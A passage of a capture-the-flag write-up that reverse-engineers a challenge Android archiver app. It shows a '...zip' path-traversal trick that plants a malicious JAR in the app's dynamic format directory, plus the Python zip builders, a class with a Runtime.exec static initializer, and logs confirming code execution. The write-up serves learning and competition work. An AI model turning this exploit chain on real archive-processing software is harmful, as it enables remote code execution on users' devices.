+This means that this is actually a recursive zip extractor! For each zip file, it creates a new directory in `workingDir` with the base filename, extracts the zip contents there, and adds those files to the output zip. If a zip file contains another zip file inside, this process will recursively repeat, as the `addFile` method of the `ZipFile` will again check the extension and call `uncompress`.
+
+The problem is, how is this class actually loaded? We need to go back and look at the `invoke` that happens in the `addFile` method of the `ZipFile` class. This is done by the `j` object stored in `f4232d`.
+
+#### Dynamic class loading
+Unfortunately, the definition for `D3.j` objects is probably the ugliest piece of code needed to analyze in this task. It defines an `invoke` method that matches in a giant switch case depending on how the object was constructed, seemingly a handler for many different dynamic loaders. 
+
+Fortunately for us, there is plenty of logger messages in our relevant case, so I've only extracted that one below:
+```java title="D3/j.java cleaned" collapse={2-14,16-23,30-31,48-62,65-67} {25-28,29,32,35-37,40-43,69}
+public final /* synthetic */ class j implements InterfaceC1174c {
+
+    /* renamed from: d, reason: collision with root package name */
+    public final /* synthetic */ int f1104d;
+
+    /* renamed from: e, reason: collision with root package name */
+    public final /* synthetic */ Object f1105e;
+
+    public /* synthetic */ j(int i, Object obj) {
+        this.f1104d = i;
+        this.f1105e = obj;
+    }
+
+    @Override // u3.InterfaceC1174c
+    public final Object invoke(Object obj) {
+        Q3.d dVar = (Q3.d) this.f1105e;
+        String it2 = (String) obj;
+        kotlin.jvm.internal.r.e(it2, "it");
+        dVar.getClass();
+        Locale locale = Locale.ROOT;
+        String lowerCase = it2.toLowerCase(locale);
+        kotlin.jvm.internal.r.d(lowerCase, "toLowerCase(...)");
+        Logger logger = dVar.f4238b;
+        logger.debug("getting format for ".concat(lowerCase));
+        LinkedHashMap linkedHashMap = dVar.f4241e;
+        if (linkedHashMap.containsKey(lowerCase)) {
+            return (ZipFormat) linkedHashMap.get(lowerCase);
+        }
+        ArrayList arrayList = dVar.f4242f;
+        String lowerCase2 = lowerCase.toLowerCase(locale);
+        kotlin.jvm.internal.r.d(lowerCase2, "toLowerCase(...)");
+        if (!arrayList.contains(lowerCase2)) {
+            return null;
+        }
+        File file = new File(dVar.f4240d, dVar.f4243g + "." + E.a(ZipFormat.class).d() + "_" + lowerCase + ".jar");
+        if (file.exists()) {
+            Q3.d.a(dVar, file);
+        } else {
+            try {
+                Q3.e eVar = dVar.f4244h;
+                if (eVar != null) {
+                    logger.debug("attempting download for format ".concat(lowerCase));
+                    response = (Response) B.w(C0751i.f8740d, new Q3.c(eVar, lowerCase, null));
+                } else {
+                    response = null;
+                }
+                if (response != null && response.isSuccessful()) {
+                    ResponseBody responseBody = (ResponseBody) response.body();
+                    InputStream byteStream = responseBody != null ? responseBody.byteStream() : null;
+                    if (byteStream != null) {
+                        try {
+                            FileOutputStream fileOutputStream = new FileOutputStream(file);
+                            try {
+                                m0.c.v(byteStream, fileOutputStream);
+                                fileOutputStream.close();
+                                logger.info("format written to " + file);
+                                byteStream.close();
+                            } finally {
+                            }
+                        } finally {
+                        }
+                    }
+                    Q3.d.a(dVar, file);
+                }
+            } catch (Throwable th) {
+                logger.error("exception during format download: " + th);
+            }
+        }
+        return (ZipFormat) linkedHashMap.get(lowerCase);
+    }
+}
+``` 
+
+The implementation is closely tied to a helper `Q3.d` class, so I'll also include that before explaining how it works:
+```java title="Q3/d.java cleaned" collapse={1-18,31-33,53-55,59-67,83-88,98-100} {38-42,48,57,68-77,79,90-93,95,97}
+package Q3;
+
+import D3.j;
+import D3.m;
+import com.badguy.mmarchiver.worker.ZipArchiver;
+import java.io.File;
+import java.util.ArrayList;
+import java.util.LinkedHashMap;
+import kotlin.jvm.internal.E;
+import kotlin.jvm.internal.r;
+import net.axolotl.zippier.ZipFormat;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+import retrofit2.Retrofit;
+
+/* loaded from: classes.dex */
+public final class d {
+
+    public final j f4237a;
+    public final Logger f4238b;
+    public final File f4239c;
+    public final File f4240d;
+    public final LinkedHashMap f4241e;
+    public final ArrayList f4242f;
+    public final String f4243g;
+    public final e f4244h;
+
+    public d(String str, JSONObject jSONObject, j jVar) {
+        this.f4237a = jVar;
+        Logger logger = LoggerFactory.getLogger(E.a(d.class).d());
+        this.f4238b = logger;
+        File file = new File(str == null ? System.getProperty("java.io.tmpdir") : str, "zippier");
+        LinkedHashMap linkedHashMap = new LinkedHashMap();
+        this.f4241e = linkedHashMap;
+        this.f4242f = new ArrayList();
+        linkedHashMap.put("zip", new a());
+        file.mkdirs();
+        File file2 = new File(file, "extract");
+        this.f4239c = file2;
+        file2.mkdirs();
+        String optString = jSONObject.optString("downloads", "downloads");
+        r.d(optString, "optString(...)");
+        File file3 = new File(optString);
+        file3 = file3.isAbsolute() ? file3 : new File(file, file3.getName());
+        try {
+            if (!file3.exists() && !file3.mkdirs()) {
+                throw new SecurityException("mkdirs() returned null");
+            }
+            this.f4240d = file3;
+            logger.info("created format download directory " + file3);
+        } catch (SecurityException e5) {
+            logger.error("failed to create format download directory " + file3 + ": " + e5);
+        }
+        if (this.f4240d != null) {
+            String optString2 = jSONObject.optString("url", "https://dl.axolotl.net/zippier");
+            r.d(optString2, "optString(...)");
+            Logger logger2 = this.f4238b;
+            if (optString2.length() > 0 && !m.q0(optString2)) {
+                try {
+                    logger2.info("format download url: ".concat(optString2));
+                    this.f4244h = (e) new Retrofit.Builder().baseUrl(optString2.concat("/")).build().create(e.class);
+                } catch (Throwable th) {
+                    logger2.error("failed to create zip format download api: " + th);
+                }
+            }
+            JSONArray optJSONArray = jSONObject.optJSONArray("formats");
+            if (optJSONArray != null) {
+                int length = optJSONArray.length();
+                for (int i = 0; i < length; i++) {
+                    ArrayList arrayList = this.f4242f;
+                    String string = optJSONArray.getString(i);
+                    r.d(string, "getString(...)");
+                    arrayList.add(string);
+                }
+            }
+        }
+        this.f4243g = jSONObject.optString("classpath", "net.axolotl.zippier");
+    }
+
+    public static void a(d dVar, File file) {
+        ClassLoader _init_$lambda$1;
+        LinkedHashMap linkedHashMap = dVar.f4241e;
+        Logger logger = dVar.f4238b;
+        j jVar = dVar.f4237a;
+        logger.debug("attempting format load from {}", file);
+        file.setWritable(false, false);
+        try {
+            String absolutePath = file.getAbsolutePath();
+            r.d(absolutePath, "getAbsolutePath(...)");
+            _init_$lambda$1 = ZipArchiver._init_$lambda$1((ZipArchiver) jVar.f1105e, absolutePath);
+            Object newInstance = _init_$lambda$1.loadClass(b4.c.a(file.getName())).getDeclaredConstructor(null).newInstance(null);
+            r.c(newInstance, "null cannot be cast to non-null type net.axolotl.zippier.ZipFormat");
+            ZipFormat zipFormat = (ZipFormat) newInstance;
+            logger.info("loaded format from " + zipFormat);
+            linkedHashMap.put(zipFormat.getExtension(), zipFormat);
+        } catch (Throwable th) {
+            logger.error("failed to load format from " + file + ": " + th);
+            file.delete();
+        }
+    }
+}
+```
+
+Essentially, `Q3.d` loads the `zippier.json` from the assets folder we found earlier and uses that to configure the dynamic loader. It first creates a map to store the formats with their corresponding ZipFormat implementations, in this case the only hardcoded one is `zip` mapped to `Q3.a`.
+
+Then, it creates a directory to store the dynamically loaded formats, and in this case, from the JSON file, that path would be `./zippier/formats`. Finally, it also stores a list of allowed formats, which from the JSON file are `7z`, `xz`, `lzma`, `bzip2`, `gz`, and `tar`. 
+
+When the `D3.j` object is invoked, it first looks for the request format in the map of loaded formats. If it is not found, then it checks if that format is in the allowed formats list. If not, it returns null.
+
+If the format is allowed, it constructs a path to the expected jar file for that format, which would be something like `./zippier/formats/<classpath>.ZipFormat_<format>.jar`. From the constructor of `Q3.d`, the classpath is `net.axolotl.zippier`, so for example for the `7z` format, it would look for `./zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar`.
+
+If the specified jar file exists, it attempts to load it using the helper method `a`, which uses a custom class loader to load the class from the file and instantiates it as a `ZipFormat` object, adding it to the map of loaded formats.
+
+If the jar file does not exist, it attempts to download it from the URL specified in the JSON file, which is `https://dl.badguy.local/zippier`. It constructs a download request using Retrofit, and if the download is successful, it writes the jar file to disk and then attempts to load it using the same helper method `a`. 
+
+Here's a flowchart summarizing the dynamic loading process:
+![flowchart of dynamic loading process](/img/writeups/2026/nsa-cbc/task7-dynamic-flow.png)
+
+Of course, this last case is not useful for us, since we can't control that server to host our own malicious jar files. Even if we could somehow get the request to point to our own server, theres no guarantee that this would work on the actual target, since they may not even have internet access.
+
+However, if we could somehow our own jar file in the `./zippier/formats/` directory, we don't need to worry about the downloading at all. We could just put a later file with that given extension, then when the code tries to uncompress it, it will trigger the dynamic loader to load our malicious `ZipFormat` implementation for that extension.
+
+### Time to stare at logs
+
+We've found the RCE vector, but how do we actually exploit it? Our earlier analysis of the `ZipArchiver` class and the `canonicalPath` checks don't allow us to write files outside of the target directory when extracting from zip files. Hmm...
+
+For now, let's set up our environment locally to test this out. We only really need to see the logcat messages, so I'll just be using Bluestacks with ADB enabled. I won't be going over how to do that here (if I had finished my previous writeup I would link it but there's plently of other tutorials online about this anyway).
+
+Once we've setup and installed the app on Bluestacks, we can open it up and see what the interface looks like:
+![Mattermost Archiver main screen](/img/writeups/2026/nsa-cbc/task7-mmarchiver-apk.png)
+
+We want the app to be able to access our local Mattermost server (hosted from Docker), so let's set up an adb reverse port forward to point port 8065 on Bluestacks to our local machine:
+```bash
+adb reverse tcp:8065 tcp:8065
+```
+
+Now we can access the Mattermost server from the emulator.
+![Mattermost login screen in Bluestacks Chrome](/img/writeups/2026/nsa-cbc/task7-mm-chrome.png)
+
+Putting in the server URL, we're asked for a login, so we can give the credentials for our `cautiousferret5` user:
+![Mattermost archiver creds login](/img/writeups/2026/nsa-cbc/task7-mmarchiver-creds.png)
+
+Now, going back to `adb`, let's pull up the logcat logs for the app. We can see some logs from when we filled in our credentials:
+```bash {"dynamic format loader initialization (Q3.d)": 5} {"scanning channels to archive":8}
+$ adb.exe shell ps | grep badguy
+u0_a135        6662   1858 12983456 63096 0                   0 S com.badguy.mmarchiver
+$ adb logcat --pid=6662 --format=color --format=tag
+--------- beginning of main
+...
+I/d       : [WM.task-2           ] created format download directory /data/user/0/com.badguy.mmarchiver/cache/zippier/formats
+I/d       : [WM.task-2           ] format download url: https://dl.badguy.local/zippier
+...
+D/FileSearchWorker: found 5 user channels
+D/FileSearchWorker: channel: id=4fbwdcfdw3r9jxgayji1py3wxe, team_id=ohmpuw7ekjf17cxufcx7fwa8ze
+D/MmAuthInterceptor: adding token to request: pj9qrr9hrffgzdxw9iqbfpb95o
+D/FileSearchWorker: found 0 files in channel
+D/FileSearchWorker: channel: id=ea4gp1z7p3n17xwfq14g66cdne, team_id=ohmpuw7ekjf17cxufcx7fwa8ze
+D/MmAuthInterceptor: adding token to request: pj9qrr9hrffgzdxw9iqbfpb95o
+D/FileSearchWorker: found 0 files in channel
+D/FileSearchWorker: channel: id=uoduu37yjbrcxgg44bdahbo1be, team_id=ohmpuw7ekjf17cxufcx7fwa8ze
+D/MmAuthInterceptor: adding token to request: pj9qrr9hrffgzdxw9iqbfpb95o
+D/FileSearchWorker: found 0 files in channel
+D/FileSearchWorker: channel: id=x55w1985afrr3g9317nghzsgbo, team_id=ohmpuw7ekjf17cxufcx7fwa8ze
+D/MmAuthInterceptor: adding token to request: pj9qrr9hrffgzdxw9iqbfpb95o
+D/FileSearchWorker: found 0 files in channel
+D/FileSearchWorker: channel: id=zwitsj3mmfbcidzu5sf7mcd8aa, team_id=ohmpuw7ekjf17cxufcx7fwa8ze
+D/MmAuthInterceptor: adding token to request: pj9qrr9hrffgzdxw9iqbfpb95o
+D/FileSearchWorker: found 0 files in channel
+```
+
+Back to the app, let's stop the current archiving task, upload some files, and start a new one. We'll use this process to keep testing without having to wait the whole 30 minute polling interval.
+
+Also, let's set up a shell at `/data/user/0/com.badguy.mmarchiver/cache/zippier/` so we can see how our files are being archived:
+```bash
+$ adb shell
+> cd /data/user/0/com.badguy.mmarchiver/cache/zippier/
+> ls -alR
+.:
+total 16
+drwx--S--- 4 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 .
+drwxrws--x 4 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 ..
+drwx--S--- 2 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 extract
+drwx--S--- 2 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 formats
+
+./extract:
+total 8
+drwx--S--- 2 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 .
+drwx--S--- 4 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 ..
+
+./formats:
+total 8
+drwx--S--- 2 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 .
+drwx--S--- 4 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 ..
+```
+
+We see our `formats` directory, our goal, as well as the `extract` directory used for temporary extraction.
+
+#### Crafting our file
+
+Let's make a small Python script to general some zip files that will test certain things for us. We can upload the files it generates to Mattermost and see how the app handles them.
+
+```python title="test.py"
+import zipfile
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.writestr('test.txt', 'This is a test file.')
+    zf.writestr('folder/test2.txt', 'This is another test file in a folder.')
+    zf.writestr('test.zip', 'This is nested zip content.')
+    zf.writestr('a.7z', 'fake 7z content')
+```
+
+Uploading to Mattermost and starting a new archive task, we can see the following logs in logcat:
+![uploading zip to Mattermost](/img/writeups/2026/nsa-cbc/task7-upload-zip.png)
+```log collapse={1-7,25-32} {8-18,23-24,33-37,39} del={19-22,37-38} 
+D/FileDownloadWorker: starting
+D/FileDownloadWorker: downloading file id=uyp6b8chsfdkxebo74an3qgsoe name=exploit.zip
+D/MmAuthInterceptor: adding token to request: pj9qrr9hrffgzdxw9iqbfpb95o
+D/MainScreenViewModel: notifications enabled: true
+D/MainScreenViewModel: token is set
+D/MainScreenViewModel: status is ArchiverStatus(running=true, error=NONE)
+D/FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/exploit.zip
+D/d       : [DefaultDispatcher-worker-4] getting format for zip
+D/b       : [DefaultDispatcher-worker-4] found format for zip
+D/a       : [DefaultDispatcher-worker-4] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/exploit.zip
+D/a       : [DefaultDispatcher-worker-4] processing zip entry test.txt
+D/d       : [DefaultDispatcher-worker-4] getting format for txt
+D/a       : [DefaultDispatcher-worker-4] processing zip entry folder/test2.txt
+D/d       : [DefaultDispatcher-worker-4] getting format for txt
+D/a       : [DefaultDispatcher-worker-4] processing zip entry test.zip
+D/d       : [DefaultDispatcher-worker-4] getting format for zip
+D/b       : [DefaultDispatcher-worker-4] found format for zip
+D/a       : [DefaultDispatcher-worker-4] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/exploit/test.zip
+D/a       : [DefaultDispatcher-worker-4] processing zip entry a.7z
+D/d       : [DefaultDispatcher-worker-4] getting format for 7z
+D/d       : [DefaultDispatcher-worker-4] attempting download for format 7z
+E/d       : [DefaultDispatcher-worker-4] exception during format download: java.net.UnknownHostException: Unable to resolve host "dl.badguy.local": No address associated with hostname
+D/b       : [DefaultDispatcher-worker-4] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/exploit.zip-1768252022481.tar.xz
+D/b       : [DefaultDispatcher-worker-4] adding entry b[exploit/] to archive file
+I/dguy.mmarchive: Starting a blocking GC Alloc
+I/dguy.mmarchive: Starting a blocking GC Alloc
+I/dguy.mmarchive: Alloc young concurrent copying GC freed 45386(1992KB) AllocSpace objects, 0(0B) LOS objects, 0% free, 126MB/126MB, paused 26us total 6.140ms
+I/dguy.mmarchive: WaitForGcToComplete blocked Background on HeapTrim for 6.259ms
+W/System  : A resource failed to call end.
+W/System  : A resource failed to call close.
+W/System  : A resource failed to call end.
+W/System  : A resource failed to call close.
+D/b       : [DefaultDispatcher-worker-4] adding entry b[exploit/test.txt] to archive file
+D/b       : [DefaultDispatcher-worker-4] adding entry b[exploit/folder/test2.txt] to archive file
+D/b       : [DefaultDispatcher-worker-4] adding entry b[test/] to archive file
+D/b       : [DefaultDispatcher-worker-4] adding entry b[exploit/a.7z] to archive file
+D/b       : [DefaultDispatcher-worker-4] deleting extraction directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/exploit
+D/b       : [DefaultDispatcher-worker-4] deleting extraction directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/test
+I/FileDownloadWorker: archived file exploit.zip successfully
+```
+
+We can see the app going through and extracting our zip file. When it gets to `test.zip` inside our zip, it again recognizes the `zip` extension and attempts to extract it. There's no files inside it though so nothing happens. 
+
+Next, it gets to `a.7z`, and we can see that it sees that the `7z` format is valid, but there is no `7z` loaded yet, and no jar exists for it, so it attempts to download it from the server, which fails since that server doesn't exist. This causes it to just skip the file and continue on. 
+
+Finally, at the bottom, we can see it adding the entries, including the `test/` that was created when extracting `test.zip`, and finally it deletes the extraction directories.
+
+#### More tests
+Let's try some more examples, including an actual valid inner zip file.
+
+```python title="test2.py"
+import zipfile
+
+with zipfile.ZipFile('inner.zip', 'w') as zf:
+    zf.writestr('test.txt', 'This is a test file inside inner zip.')
+    zf.writestr('folder/test2.txt', 'This is another test file in a folder inside inner zip.')
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.write('inner.zip', 'inner.zip')
+
+    zf.writestr('folder', 'Test folder on existing path.')
+    zf.writestr('folder/test.txt', 'This is a test file in a folder.')
+```
+
+This time, we create a valid `inner.zip` file with some files inside, then add that to our main `exploit.zip`. We also attempt to have a folder created on a normal file path to see how that is handled.
+
+Archiving again, we see the following logs:
+```log collapse={1-5,10-11} {6-9,12,14-19} del={20-24}
+D/FileDownloadWorker: starting
+D/WM-Processor: Work WorkGenerationalId(workSpecId=fbf5b380-9268-4cb1-850f-0a18094ee618, generation=0) is already enqueued for processing
+D/FileDownloadWorker: downloading file id=nsg3csq7h3bedcw958xgn8qy3c name=exploit.zip
+D/MmAuthInterceptor: adding token to request: pj9qrr9hrffgzdxw9iqbfpb95o
+D/FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/exploit.zip
+D/d       : [DefaultDispatcher-worker-5] getting format for zip
+D/b       : [DefaultDispatcher-worker-5] found format for zip
+D/a       : [DefaultDispatcher-worker-5] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/exploit.zip
+D/a       : [DefaultDispatcher-worker-5] processing zip entry inner.zip
+D/MainScreenViewModel: notifications enabled: true
+D/MainScreenViewModel: token is set
+D/d       : [DefaultDispatcher-worker-5] getting format for zip
+D/MainScreenViewModel: status is ArchiverStatus(running=true, error=NONE)
+D/b       : [DefaultDispatcher-worker-5] found format for zip
+D/a       : [DefaultDispatcher-worker-5] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/exploit/inner.zip
+D/a       : [DefaultDispatcher-worker-5] processing zip entry test.txt
+D/d       : [DefaultDispatcher-worker-5] getting format for txt
+D/a       : [DefaultDispatcher-worker-5] processing zip entry folder/test2.txt
+D/d       : [DefaultDispatcher-worker-5] getting format for txt
+D/a       : [DefaultDispatcher-worker-5] processing zip entry folder
+D/d       : [DefaultDispatcher-worker-5] getting format for
+D/a       : [DefaultDispatcher-worker-5] processing zip entry folder/test.txt
+E/FileDownloadWorker: failed to create archive file: java.io.IOException: failed to create directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/exploit/folder
+I/FileDownloadWorker: file download failed, requeueing (error=FILE_ARCHIVE_FAILED)
+```
+
+For this zip file, the archiving failed, since the app was unable to create the directory `folder` when extracting from the inner zip. This is because a file named `folder` already exists from our earlier `zf.writestr('folder', 'Test folder on existing path.')` line, so it can't create a directory with the same name. This results in an `IOException: failed to create directory ` error, and the archiving task is canceled, meaning it doesn't delete the temporary extraction directories.
+
+In our shell, we can see the leftover extraction directories, including the `inner/` directory with the files from the inner zip:
+```bash
+$ ls -lR
+.:
+total 8
+drwx--S--- 4 u0_a135 u0_a135_cache 4096 2026-01-12 15:28 extract
+drwx--S--- 2 u0_a135 u0_a135_cache 4096 2026-01-12 14:45 formats
+
+./extract:
+total 8
+drwx--S--- 2 u0_a135 u0_a135_cache 4096 2026-01-12 15:28 exploit
+drwx--S--- 3 u0_a135 u0_a135_cache 4096 2026-01-12 15:28 inner
+
+./extract/exploit:
+total 8
+-rw------- 1 u0_a135 u0_a135_cache  29 2026-01-12 15:28 folder
+-rw------- 1 u0_a135 u0_a135_cache 314 2026-01-12 15:28 inner.zip
+
+./extract/inner:
+total 8
+drwx--S--- 2 u0_a135 u0_a135_cache 4096 2026-01-12 15:28 folder
+-rw------- 1 u0_a135 u0_a135_cache   37 2026-01-12 15:28 test.txt
+
+./extract/inner/folder:
+total 4
+-rw------- 1 u0_a135 u0_a135_cache 55 2026-01-12 15:28 test2.txt
+
+./formats:
+total 0
+```
+
+When there is a zip entry `<name>.zip`, the app creates a directory named `<name>/` when recursively extracting, then sets that new directory as the target path for extraction. 
+
+However, we can't just do `../formats.zip`, since the zip file needs to be extracted first before it can be recursively uncompressed, and that extraction step has the `canonicalPath` check which prevents directory traversal.
+
+After many days of thinking (and celebrating New Years), I finally realized I hadn't tried a super simple idea. We don't need the slash in our zip name, since the app calls `mkdirs`, which will create the name as a directory, even if it doesn't end with a slash.
+
+Thus, we can name our zip... `...zip`! When the extension is removed, this results in `zippier/extract/..` as the path that gets passed to `mkdirs`, then eventually becomes the target path for extraction. The `canonicalPath` check will resolve the `..` to the parent directory, which is `zippier/`, allowing us to write files directly into the `formats/` directory! 
+
+```python title="poc.py"
+import zipfile
+
+with zipfile.ZipFile('...zip', 'w') as zf:
+    zf.writestr('formats/net.axolotl.zippier.ZipFormat_7z.jar', 'fake jar content')
+    zf.writestr('a.7z', 'fake 7z content')
+    # cause error so folders don't get deleted
+    zf.writestr('a', '')
+    zf.writestr('a/a.txt', '')
+```
+
+```log {2-6} ins={7-10} 
+D/FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/...zip
+D/d       : [DefaultDispatcher-worker-2] getting format for zip
+D/b       : [DefaultDispatcher-worker-2] found format for zip
+D/a       : [DefaultDispatcher-worker-2] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/...zip
+D/a       : [DefaultDispatcher-worker-2] processing zip entry formats/net.axolotl.zippier.ZipFormat_7z.jar
+D/d       : [DefaultDispatcher-worker-2] getting format for jar
+D/a       : [DefaultDispatcher-worker-2] processing zip entry a.7z
+D/d       : [DefaultDispatcher-worker-2] getting format for 7z
+D/d       : [DefaultDispatcher-worker-2] attempting format load from /data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar
+E/d       : [DefaultDispatcher-worker-2] failed to load format from /data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar: java.lang.ClassNotFoundException: Didn't find class "net.axolotl.zippier.ZipFormat_7z" on path: DexPathList[[zip file "/data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar"],nativeLibraryDirectories=[/system/lib64, /system/product/lib64, /system/vendor/lib64]]
+D/a       : [DefaultDispatcher-worker-2] processing zip entry a
+D/d       : [DefaultDispatcher-worker-2] getting format for
+D/a       : [DefaultDispatcher-worker-2] processing zip entry a/a.txt
+E/FileDownloadWorker: failed to create archive file: java.io.IOException: failed to create directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/../a
+```
+
+This time, we can see the app actually tries to load the 7z JAR file! The JAR doesn't contain a valid class, but we can tell the code is working as intended. 
+
+Now, all we have to do is actually create a malicious JAR file that implements the `ZipFormat` interface, and we have our RCE!
+
+### Final exploit
+
+We can imitate the correct package structure from the original `ZipFormat` class to create our own.
+```java title="ZipFile.java" collapse={1-10}
+package net.axolotl.zippier;
+
+import java.io.File;
+
+public interface ZipFile {
+    ZipFile addFile(File file);
+
+    void write();
+}
+```
+
+```java title="ZipFormat.java" collapse={1-10}
+package net.axolotl.zippier;
+
+import java.io.File;
+
+public interface ZipFormat {
+    String getExtension();
+
+    void uncompress(File file, File file2, ZipFile zipFile);
+}
+```
+
+```java title="ZipFormat_7z.java"
+package net.axolotl.zippier;
+import java.io.*;
+
+public class ZipFormat_7z implements ZipFormat {
+    public String getExtension() {
+        return "7z";
+    }
+
+    public void uncompress(File inFile, File targetPath, ZipFile outFile) {
+        System.out.println("[7zHandler] Uncompressing 7z file: " + inFile.getAbsolutePath() + " -> " + targetPath.getAbsolutePath());
+    }
+
+    // onload run some code
+    static {
+        System.out.println("[7zHandler] 7z format handler loaded");
+        try {
+            Process p = Runtime.getRuntime().exec("echo 7z format handler initialized");
+            p.waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+We need Android Studio to compile this into a proper dex jar file, since a normal Java jar won't work on Android. More specifically, we can use the `d8` tool that comes with the Android SDK to convert a normal jar into a dex jar.
+
+```bash
+javac -source 1.8 -target 1.8 *.java
+jar -cvf tmp.jar net/axolotl/zippier/ZipFormat_7z.class
+# Use d8 to convert to dex jar
+<sdk_path>/build-tools/d8 --lib "<sdk_path>/platforms/android/android-36/android.jar" --output . tmp.jar
+# make real final jar
+rm tmp.jar
+zip ZipFormat_7z.jar classes.dex
+rm classes.dex
+```
+
+Now we can use our earlier script to put it all together:
+```python title="solve.py" ins={4}
+import zipfile
+
+with zipfile.ZipFile('...zip', 'w') as zf:
+    zf.write('ZipFormat_7z.jar', 'formats/net.axolotl.zippier.ZipFormat_7z.jar')
+    zf.writestr('a.7z', 'fake 7z content')
+    # cause error so folders don't get deleted
+    zf.writestr('a', '')
+    zf.writestr('a/a.txt', '')
+```
+
+```log collapse={1-4,14-17} {4-8} ins={9-13} 
+D/FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/...zip
+D/d       : [DefaultDispatcher-worker-1] getting format for zip
+D/b       : [DefaultDispatcher-worker-1] found format for zip
+D/a       : [DefaultDispatcher-worker-1] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/...zip
+D/a       : [DefaultDispatcher-worker-1] processing zip entry formats/net.axolotl.zippier.ZipFormat_7z.jar
+D/d       : [DefaultDispatcher-worker-1] getting format for jar
+D/a       : [DefaultDispatcher-worker-1] processing zip entry a.7z
+D/d       : [DefaultDispatcher-worker-1] getting format for 7z
+D/d       : [DefaultDispatcher-worker-1] attempting format load from /data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar
+I/System.out: [7zHandler] 7z format handler loaded
+I/d       : [DefaultDispatcher-worker-1] loaded format from net.axolotl.zippier.ZipFormat_7z@c60f65e
+D/b       : [DefaultDispatcher-worker-1] found format for 7z
+I/System.out: [7zHandler] Uncompressing 7z file: /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/../a.7z -> /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/a
+D/a       : [DefaultDispatcher-worker-1] processing zip entry a
+D/d       : [DefaultDispatcher-worker-1] getting format for
+D/a       : [DefaultDispatcher-worker-1] processing zip entry a/a.txt
+E/FileDownloadWorker: failed to create archive file: java.io.IOException: failed to create directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/../a
+```
+
+We can see that the `7z` format handler is successfully loaded, and our static initializer code runs, printing out our message. Then, when `uncompress` is called, our method is invoked, and we see the uncompressing message printed out as well!
+
+We've finally solved the task! Submitting our created `...zip` file is the final step to get the flag.
+We don't need to write actual exploitation code, the NSA Codebreaker platform simply checks that the JAR file loads correctly without crashing (including being casted to the `ZipFormat` interface)
+
+
+<Callout>
+When I first completed this task, I used an inner `...zip`, which works the same, just makes it so that you can name the outer zip anything you want. However, I realized later that it's not necessary to have the inner zip, so I simplified the final exploit.
+
+```python title="old_solve.py"
+import zipfile
+
+with zipfile.ZipFile('inner.zip', 'w') as zf:
+    zf.write('formats/net.axolotl.zippier.ZipFormat_7z.jar', 'ZipFormat_7z.jar')
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.write('inner.zip', '...zip')
+
+    zf.writestr('a.7z', 'fake 7z content')
+```
+
+Also, I did struggle a bit with it not being properly castable to a `ZipFormat`, since the static code block runs before the cast occurs, meaning you don't need to even have it be castable for the device to be exploited. I personally think this is a small flaw on the competition's part, since this is still technically exploitation. 
+</Callout>
+
+That's it for these writeups! I hope you enjoyed reading them and learned something new. These challenges are usually a great time, even though they can suffer from some issues in balancing (2), I'd still recommend participating in future NSA Codebreaker competitions if you get the chance.
